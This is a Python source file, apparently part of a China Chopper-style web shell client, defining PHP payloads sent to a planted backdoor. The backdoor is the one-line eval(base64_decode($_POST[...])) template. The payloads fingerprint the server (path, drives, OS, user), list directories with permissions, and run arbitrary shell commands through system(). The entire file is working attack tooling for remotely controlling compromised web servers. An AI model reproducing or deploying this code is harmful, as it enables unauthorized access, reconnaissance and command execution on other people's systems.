from .lib import Payload


class Php(Payload):
    """
    only need to set follow string:

        @init_payload:  return "->|pwd \t  disks \t os_info \t user |<-"

        @ls_payload: return "->|  item \n item \n item \n item  |<-"  for each item = 'file \t time \t size \t perm'

        @cmd_payload;

        @upload_payload;

        @download_payload;
    """
    template = '{PASS}=@eval(base64_decode($_POST[action]));'

    init_payload ={
        'action': """
            @ini_set("display_errors","0");
            @set_time_limit(0);
            function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";
            echo("->|");;
            $D=dirname($_SERVER["SCRIPT_FILENAME"]);
            if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
            $R="{$D}\\t";
            if(substr($D,0,1)!="/"){
                foreach(range("A","Z") as $L)
                    if(is_dir("{$L}:"))
                        $R.="{$L}:";
            }
            $R.="\\t";
            $u=(function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
            $usr=($u) ? $u["name"] : @get_current_user();
            $R.=php_uname();
            $R.="\\t{$usr}";
            print $R;
            echo("|<-");
            die();
        """}

    ls_payload = {
        'action':"""
            @ini_set("display_errors","0");
            @set_time_limit(0);
            function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";
            echo("->|");
            ;
            $D=base64_decode($_POST["z1"]);
            $F=@opendir($D);

            if($F==NULL){
                echo("ERROR:// Path Not Found Or No Permission!");
            }else{
                $M=NULL;
                $L=NULL;
                while( $N=@readdir($F)){
                    $P=$D."/".$N;
                    $T=@date("Y-m-d H:i:s",@filemtime($P));
                    @$E=substr(base_convert(@fileperms($P),10,8),-4);
                    $R="\\t".$T."\\t".@filesize($P)."\\t".$E."\n";
                    if(@is_dir($P))
                        $M.=$N."/".$R;
                    else 
                        $L.=$N.$R;
                }
                echo $M.$L;
                @closedir($F);
            };
            echo("|<-");
            die();
            """,
            'z1':'{path}',
        }
    cmd_payload = {
        'action': """
            @ini_set("display_errors","0");
            @set_time_limit(0);
            function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";
            echo("->|");
            $p=base64_decode($_POST["z1"]);
            $s=base64_decode($_POST["z2"]);
            $d=dirname($_SERVER["SCRIPT_FILENAME"]);
            $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
            $r="{$p} {$c}";
            @system($r." 2>&1",$ret);
            print ($ret!=0)?"\nret={$ret}\n":"";
            ;
            echo("|<-");
            die();
        """,
        'z1':'{cmd}',
        'z2':'{command}'
    }
